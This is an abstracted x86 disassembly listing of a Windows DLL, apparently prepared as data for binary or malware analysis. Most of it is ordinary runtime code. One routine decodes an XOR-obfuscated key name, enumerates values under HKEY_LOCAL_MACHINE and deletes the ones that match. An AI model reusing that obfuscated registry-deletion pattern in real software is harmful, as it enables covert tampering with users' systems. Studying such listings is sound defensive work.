mov eax [ ebp - 0x18 ]
mov edi [ eax + 0xd4 ]
mov [ ebp - 0x4 ] ebx
mov esi [ ebp - 0x4 ]
push [ edi + esi * 4 + 0x1c ]
call sub_10078ac0
push [ edi + esi * 4 ]
mov [ ebp - 0x8 ] eax
call sub_10078ac0
add eax ebx
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
lea ebx [ eax + ecx + 0x2 ]
jb r-xdata
lea eax [ ebx + 0x1 ]
push eax
call sub_10028397
mov esi eax
pop ecx
mov [ ebp - 0x8 ] esi
test esi esi
je r-xdata
cmp [ ebp - 0xc ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x8 ]
leave
retn
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000b659
int3
push esi
call sub_10078ac0
add esi eax
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi + eax * 4 + 0x1c ]
mov eax [ ebp - 0x8 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_10005e18
add esp 0x10
test eax eax
jne r-xdata
push esi
call sub_10078ac0
add esi eax
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi + eax * 4 ]
mov eax [ ebp - 0x8 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_10005e18
add esp 0xc
test eax eax
jne r-xdata
mov [ esi ] 0x0
sub_1000450d
push 0x8
push r--data
call sub_10078b50
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_10078b95
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_1004243b
mov [ ebp - 0x4 ] 0xfffffffe
sub_10004570
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov esi ecx
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
or edx 0xffffffff
sub edx eax
cmp edx edi
ja r-xdata
mov edx [ esi + 0x14 ]
cmp edx 0x8
jb r-xdata
test edi edi
je r-xdata
push r--data
call sub_100616c6
cmp eax ecx
jb r-xdata
mov ecx [ esi ]
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
lea ebx [ eax + edi ]
cmp ebx 0x7ffffffe
jbe r-xdata
cmp edx 0x8
jb r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx ebx
jae r-xdata
push r--data
call sub_100616c6
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
test ebx ebx
jne r-xdata
push eax
push ebx
mov ecx esi
call sub_1000fb70
test ebx ebx
je r-xdata
cmp edx 0x8
jb r-xdata
mov ebx [ esi + 0x10 ]
lea ecx [ ecx + ebx * 2 ]
cmp ecx eax
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov [ esi + 0x10 ] ebx
cmp ecx 0x8
jb r-xdata
mov ecx esi
sub eax ecx
sar eax 0x1
push eax
push esi
mov eax edi
call sub_10055aa0
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx [ esi ]
sub eax ecx
sar eax 0x1
push eax
push esi
mov eax edi
call sub_10055aa0
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop edi
mov eax esi
xor ecx ecx
pop esi
mov [ eax ] cx
pop ebx
pop ebp
retn 0x4
mov eax [ esi ]
xor ecx ecx
pop edi
mov [ eax ] cx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ esi + 0x10 ]
push edx
add edi edi
push ecx
add eax edi
push eax
call sub_1005b440
add esp 0xc
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
xor edx edx
mov [ eax + ebx * 2 ] dx
mov eax [ esi ]
xor edx edx
mov [ eax + ebx * 2 ] dx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx [ ebp + 0x8 ]
push edi
push ecx
push eax
call sub_10078600
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] ebx
jb r-xdata
sub_100046ba
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1005e982
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_10004757
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x10 ]
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x404e
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
cmp [ ebp + 0xc ] ebx
jbe r-xdata
cmp [ eax + 0x8 ] ebx
jne r-xdata
xor ecx ecx
mov [ ebp + 0x10 ] ebx
mov edi [ eax + 0x8 ]
test edi 0x8000
jne r-xdata
mov edx [ eax + 0x4 ]
mov [ ebp + 0x10 ] 0x1
cmp edx [ ebp - 0x18 ]
jae r-xdata
mov cx [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax + 0xa ] cx
pop ebx
leave
retn
mov ecx [ eax + 0x4 ]
mov ecx [ eax ]
add [ ebp - 0x4 ] 0xfff0
mov edi edx
mov esi ecx
shr esi 0x10
shl edx 0x10
shr edi 0x10
or edx esi
shl ecx 0x10
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
cmp edi ebx
je r-xdata
mov [ eax + 0x8 ] edi
mov esi [ ebp - 0x14 ]
and [ ebp + 0x10 ] 0x0
lea ebx [ edi + esi ]
cmp ebx edi
jb r-xdata
mov esi [ ebp - 0x8 ]
and [ ebp + 0x10 ] 0x0
lea edi [ esi + 0x1 ]
cmp edi esi
jb r-xdata
cmp [ ebp + 0x10 ] 0x0
mov [ eax ] edx
je r-xdata
mov ebx [ eax ]
add [ ebp - 0x4 ] 0xffff
mov esi ecx
mov edx ebx
shr esi 0x1f
add edi edi
shr edx 0x1f
add ecx ecx
or edi esi
add ebx ebx
or ecx edx
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
test edi 0x8000
je r-xdata
mov [ ebp + 0x10 ] 0x1
cmp ebx esi
jae r-xdata
mov [ ebp + 0x10 ] 0x1
cmp edi 0x1
jae r-xdata
add ecx [ ebp - 0x10 ]
and [ ebp - 0x8 ] 0x0
mov edi ebx
add ecx ecx
mov esi edx
shr edi 0x1f
or ecx edi
shr esi 0x1f
add ebx ebx
add edx edx
or ebx esi
mov [ eax + 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
movsx esi [ ecx ]
lea ecx [ edx + esi ]
mov [ ebp - 0x18 ] esi
cmp ecx edx
jb r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] ebx
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] edi
je r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx esi
jae r-xdata
dec [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edx
ja r-xdata
lea edx [ ebx + 0x1 ]
xor esi esi
cmp edx ebx
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
mov [ eax ] ecx
je r-xdata
mov esi eax
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx ecx
lea edi [ ecx + ecx ]
shr edx 0x1f
lea ecx [ ebx + ebx ]
or ecx edx
mov edx [ ebp + 0x10 ]
and [ ebp + 0x10 ] 0x0
mov esi ebx
mov ebx ecx
mov [ ebp - 0x8 ] edi
shr esi 0x1f
add edx edx
or edx esi
mov esi [ ebp - 0x8 ]
add ecx ecx
shr edi 0x1f
or ecx edi
mov edi ecx
mov [ ebp - 0x8 ] ecx
lea ecx [ edx + edx ]
mov edx [ ebp - 0x18 ]
add esi esi
shr ebx 0x1f
or ecx ebx
add edx esi
mov [ eax ] esi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ecx
cmp edx esi
jb r-xdata
xor ebx ebx
xor esi esi
inc esi
cmp edx 0x1
jae r-xdata
mov edx [ ebp - 0xc ]
inc edx
mov [ ebp + 0x10 ] edx
mov [ eax + 0x8 ] edx
mov ebx edx
mov [ eax + 0x4 ] edx
test esi esi
je r-xdata
sub_10004940
push ebp
mov ebp esp
push 0xffffffff
push sub_10080bb3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi + 0x3c4 ]
mov eax [ esi + 0x3c0 ]
mov [ ebp - 0x48 ] esi
mov ebx edx
cmp eax ecx
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x5
call sub_1001bb80
mov edi [ esi + 0x3a0 ]
mov eax [ esi + 0x3a4 ]
cmp edi eax
je r-xdata
cmp [ eax ] ebx
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ edi ]
cmp ebx [ ecx ]
je r-xdata
cmp eax ecx
je r-xdata
add eax 0x8
cmp eax ecx
jne r-xdata
mov edx [ esi + 0x34 ]
lea ecx [ esi + 0x20 ]
cmp edx 0x10
jb r-xdata
add edi 0x4
cmp edi eax
jne r-xdata
mov edx ecx
add eax 0x8
cmp eax edx
je r-xdata
mov esi ecx
mov esi [ ecx ]
jmp r-xdata
jmp r-xdata
add [ esi + 0x3c4 ] 0xfffffff8
jmp r-xdata
lea ecx [ eax - 0x8 ]
lea ecx [ ecx ]
xor edx edx
mov [ ebp - 0x44 ] dx
mov edx [ ebp - 0x48 ]
push edx
push eax
push ecx
lea eax [ ebp - 0x44 ]
xor esi esi
push eax
mov [ ebp - 0x30 ] 0x7
mov [ ebp - 0x34 ] esi
call sub_1005f8e0
mov [ ebp - 0x4 ] esi
mov esi [ edi ]
lea eax [ ebp - 0x28 ]
lea edx [ esi + 0x4 ]
lea ebx [ eax + 0x2 ]
nop
mov ecx [ ecx ]
mov eax [ ecx + 0x10 ]
add eax esi
cmp edx 0x10
jb r-xdata
mov edi [ eax ]
mov [ ecx ] edi
mov edi [ eax + 0x4 ]
mov [ ecx + 0x4 ] edi
add eax 0x8
add ecx 0x8
cmp eax edx
jne r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax ebx
sar eax 0x1
push eax
lea ecx [ ebp - 0x28 ]
push ecx
push edx
call sub_10009310
cmp eax 0xffffffff
jne r-xdata
mov [ esi ] 0x3e8
mov [ ebp - 0x4c ] esi
test esi esi
je r-xdata
mov edx [ ebp - 0x44 ]
push edx
call sub_10065045
add esp 0x4
mov esi [ ebp - 0x48 ]
mov ecx [ esi + 0x3a4 ]
lea eax [ edi + 0x4 ]
sub ecx eax
sar ecx 0x2
add ecx ecx
add ecx ecx
push ecx
push eax
push edi
call sub_10077d10
add esp 0xc
add [ esi + 0x3a4 ] 0xfffffffc
jmp r-xdata
lea ecx [ esi + 0x20 ]
mov [ ebp - 0x4 ] 0x1
call sub_10008ab0
cmp [ esi + 0x18 ] 0x8
jb r-xdata
cmp [ ebp - 0x30 ] 0x8
jb r-xdata
xor eax eax
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] 0x0
push esi
mov [ esi + 0x4 ] ax
call sub_10065045
add esp 0x4
mov edx [ esi + 0x4 ]
push edx
call sub_10065045
add esp 0x4
sub_10004b00
push 0x4
mov eax sub_1007e209
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_100067d1
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0xc ]
jmp r-xdata
test esi esi
jne r-xdata
mov eax [ edi + 0x8 ]
dec esi
lea eax [ eax + esi * 4 ]
cmp [ eax ] 0x0
je r-xdata
push [ edi + 0x8 ]
call sub_10020a90
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
call sub_1002470e
call sub_1001a1b3
retn
mov ecx [ eax ]
call sub_10049900
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_10004b60
push ebp
mov ebp esp
sub esp 0x4a0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ ebp - 0x49c ] eax
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffd9
and edx 0xff
mov [ ebp + eax * 2 - 0x84 ] dx
inc eax
cmp eax 0x3f
jb r-xdata
lea ecx [ ebp - 0x490 ]
push ecx
push 0x2011b
xor eax eax
push eax
lea edx [ ebp - 0x84 ]
push edx
push 0x80000002
mov [ ebp - 0x6 ] ax
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x490 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x494 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
call [ RegQueryInfoKeyW@IAT ]
test eax eax
je r-xdata
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push esi
xor esi esi
cmp [ ebp - 0x494 ] esi
jbe r-xdata
mov edx [ ebp - 0x490 ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x490 ]
push eax
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push edi
mov edi [ RegEnumValueW@IAT ]
inc esi
cmp esi [ ebp - 0x494 ]
jb r-xdata
mov edx [ ebp - 0x49c ]
push edx
lea eax [ ebp - 0x28c ]
push eax
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4a0 ]
push eax
lea ecx [ ebp - 0x28c ]
push ecx
mov ecx [ ebp - 0x490 ]
push 0x0
push 0x0
lea edx [ ebp - 0x498 ]
push edx
lea eax [ ebp - 0x48c ]
push eax
push esi
push ecx
mov [ ebp - 0x498 ] 0xff
mov [ ebp - 0x4a0 ] 0x208
call edi
test eax eax
jne r-xdata
pop edi
mov edx [ ebp - 0x490 ]
lea ecx [ ebp - 0x48c ]
push ecx
push edx
call [ RegDeleteValueW@IAT ]
sub_10004ce0
push 0xffffffff
push 0x0
push edi
mov ecx esi
call sub_1001c310
push 0xffffffff
push 0x0
lea eax [ edi + 0x1c ]
push eax
lea ecx [ esi + 0x1c ]
call sub_1001c310
mov cx [ edi + 0x38 ]
push 0xffffffff
push 0x0
lea edx [ edi + 0x3c ]
mov [ esi + 0x38 ] cx
push edx
lea ecx [ esi + 0x3c ]
call sub_1001c310
push 0xffffffff
push 0x0
lea eax [ edi + 0x58 ]
push eax
lea ecx [ esi + 0x58 ]
call sub_1001c310
mov cl [ edi + 0x74 ]
mov [ esi + 0x74 ] cl
mov edx [ edi + 0x78 ]
mov [ esi + 0x78 ] edx
mov eax [ edi + 0x7c ]
mov [ esi + 0x7c ] eax
mov eax esi
retn
sub_10004d50
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
pop ebp
retn
mov edi edi
mov eax ecx
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_10004d70
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0xc ]
mov ecx esi
sub ecx eax
push ecx
push eax
push edx
call sub_10078600
add esp 0xc
mov eax esi
pop esi
pop ebp
retn 0x10
sub_10004dbc
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_10004e00
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
mov [ esi ] 0x0
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
add eax eax
add eax eax
push eax
push ecx
call sub_10024af0
add esp 0x8
mov [ esi ] eax
pop esi
pop ebp
retn
sub_10004e58
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_1003ffe5
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_100261d5
pop ecx
mov ebx eax
call sub_10012991
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_10078970
add esp 0xc
sub_10004ed0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fae7
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push 0xffffffff
lea ecx [ esi + 0x4 ]
xor edi edi
mov [ esi ] r--data
push edi
mov ebx 0x7
xor eax eax
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push edx
mov [ ecx ] ax
call sub_1001c310
mov ax [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
mov [ esi + 0x20 ] ax
mov eax [ ebp + 0x10 ]
push 0xffffffff
lea ecx [ esi + 0x24 ]
push edi
xor edx edx
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push eax
mov [ ecx ] dx
call sub_1001c310
mov eax [ ebp + 0x14 ]
push 0xffffffff
lea ecx [ esi + 0x40 ]
mov [ ebp - 0x4 ] 0x1
push edi
xor edx edx
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push eax
mov [ ecx ] dx
call sub_1001c310
mov eax [ ebp + 0x18 ]
push 0xffffffff
lea ecx [ esi + 0x5c ]
mov [ ebp - 0x4 ] 0x2
push edi
xor edx edx
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push eax
mov [ ecx ] dx
call sub_1001c310
mov eax [ ebp + 0x1c ]
push 0xffffffff
lea ecx [ esi + 0x78 ]
mov [ ebp - 0x4 ] 0x3
push edi
xor edx edx
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push eax
mov [ ecx ] dx
call sub_1001c310
mov eax [ ebp + 0x20 ]
push 0xffffffff
lea ecx [ esi + 0x94 ]
mov [ ebp - 0x4 ] 0x4
push edi
xor edx edx
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push eax
mov [ ecx ] dx
call sub_1001c310
mov ecx [ ebp + 0x24 ]
mov edx [ ebp + 0x28 ]
mov [ esi + 0xb0 ] ecx
mov [ esi + 0xb4 ] edx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_10004fe4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_1002d1db
push esi
mov edi eax
call sub_10062366
push esi
call sub_1001742d
push eax
call sub_1004a1ef
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_10020a90
and [ esi + 0x1c ] 0x0
pop ecx
sub_10005051
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x1
je r-xdata
call sub_10012991
mov [ eax ] 0x21
jle r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0x3
jg r-xdata
call sub_10012991
mov [ eax ] 0x22
pop ebp
retn
sub_1000507e
push 0x10
push r--data
call sub_10078b50
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_10012991
mov [ eax ] 0x9
call sub_10012991
mov [ eax ] 0x9
call sub_1002788e
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_10078b95
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_10038317
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_10012991
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_10042d7c
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000514f
mov eax [ ebp - 0x1c ]
call sub_1003c242
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_10005160
push ebp
mov ebp esp
push 0xffffffff
push sub_10081c18
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov edi ecx
mov ecx [ eax ]
xor eax eax
mov [ ebp - 0x2c ] ax
mov eax ecx
mov esi edx
lea edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x68 ] edx
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax [ ebp - 0x68 ]
sar eax 0x1
push eax
push ecx
lea ecx [ ebp - 0x2c ]
call sub_1005e3c0
lea eax [ ebp - 0x2c ]
mov edx esi
push eax
lea esi [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x0
call sub_10036350
push eax
mov edx ebx
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_10045750
add esp 0x8
push 0xffffffff
xor ebx ebx
push ebx
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call sub_1000c1e0
mov esi 0x8
cmp [ ebp - 0x34 ] esi
jb r-xdata
xor edx edx
mov edi 0x7
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] dx
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_10065045
add esp 0x4
xor ecx ecx
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] cx
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x2c ]
push edx
call sub_10065045
add esp 0x4
sub_10005280
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx eax
push esi
push edi
test ebx ebx
jne r-xdata
call sub_10007e40
test eax eax
je r-xdata
lea eax [ ebx + 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x128 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
test eax eax
je r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ebx rw-data
mov [ ebp - 0xc ] rw-data
mov [ ebp - 0x4 ] ebx
mov edi [ eax ]
test edi edi
je r-xdata
mov eax 0x3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
push eax
push ebx
call [ StrCpyW@IAT ]
mov eax [ ebp - 0xc ]
mov esi [ edi + 0x8 ]
push eax
add ebx 0x3cf0
call sub_10030bd0
add esp 0x4
test eax eax
jne r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov esi [ edi + 0xc ]
lea ecx [ eax + 0xb7fc ]
push ecx
lea ebx [ eax + 0x7b0c ]
call sub_1002d380
add esp 0x4
test eax eax
jne r-xdata
mov eax 0x6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
lea ecx [ eax + rw-data ]
test ecx ecx
je r-xdata
mov eax 0x7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl [ edi + 0x10 ]
add [ ebp - 0xc ] 0x2
add [ ebp - 0x4 ] 0x208
mov [ ecx ] dl
mov ecx [ edi + 0x14 ]
mov [ eax * 4 + rw-data ] ecx
mov edx [ edi + 0x18 ]
mov ecx [ ebp - 0x10 ]
mov [ eax * 4 + rw-data ] edx
mov ecx [ ecx + 0x4 ]
inc eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
mov ebx [ ebp - 0x4 ]
mov eax ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x1e
jae r-xdata
sub_100053e0
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
sub eax esi
sar eax 0x2
cmp eax 0x28
jle r-xdata
mov eax [ esi ]
mov ecx [ edi ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
inc eax
cdq
and edx 0x7
add eax edx
mov edx [ esi ]
sar eax 0x3
lea ecx [ eax * 8 ]
lea ebx [ eax * 4 ]
mov eax [ ebx + esi ]
push edx
push eax
mov [ ebp - 0xc ] ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov eax [ edi ]
mov ecx [ ebx ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edi ]
mov [ edi ] edx
mov [ esi ] eax
mov edx [ ebx + esi ]
mov eax [ ebp - 0xc ]
mov ecx [ eax + esi ]
push edx
push ecx
